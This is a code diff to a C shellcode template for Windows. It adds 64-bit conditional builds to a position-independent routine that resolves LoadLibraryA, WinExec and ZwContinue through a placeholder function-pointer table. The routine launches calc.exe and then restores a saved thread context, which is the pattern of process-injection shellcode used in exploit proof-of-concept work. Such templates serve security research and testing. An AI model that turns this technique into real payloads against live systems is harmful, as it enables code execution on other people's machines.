@@ -13,6 +13,7 @@ FUNCTIONPOINTERS g_FunctionPointers;
 
 void shellcode_entry();
 
+#ifndef _WIN64
 __declspec(naked) void fix_esp()
 {
     __asm{
@@ -25,12 +26,17 @@ __declspec(naked) void fix_esp()
         nop;
         nop;
     }
-    
 }
+#endif
+
 
 void shellcode_entry()
 {
+#ifndef _WIN64
     PFUNCTIONPOINTERS ptFunctionPointer = 0x13371337;
+#else
+    PFUNCTIONPOINTERS ptFunctionPointer = 0x1337133713371337;
+#endif
     pfnWinExec pfnWinExec;
     pfnZwContinue pfnZwContinue;
     void * ptContext;
@@ -41,10 +47,11 @@ void shellcode_entry()
     char pszZwContinue[] = { 'Z','w','C','o','n','t','i','n','u','e', '\0'};
     char pszWinExec[] = { 'W', 'i', 'n', 'E', 'x', 'e', 'c', '\0' };
     char pszCalcExe[] = { 'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', '\0' };
-
-    __asm{
-        mov[ptContext], edi;
-    }
+#ifndef _WIN64
+__asm{
+    mov[ptContext], edi;
+}
+#endif
 
     hKernel32 = ptFunctionPointer->pfnLoadLibraryA(pszKernel32);
     if (0 == hKernel32)
@@ -89,7 +96,9 @@ int main()
 {
     g_FunctionPointers.pfnGetProcAddress = GetProcAddress;
     g_FunctionPointers.pfnLoadLibraryA = LoadLibraryA;
+#ifndef _WIN64    
     fix_esp();
+#endif
     shellcode_entry();
     dummy();
 }
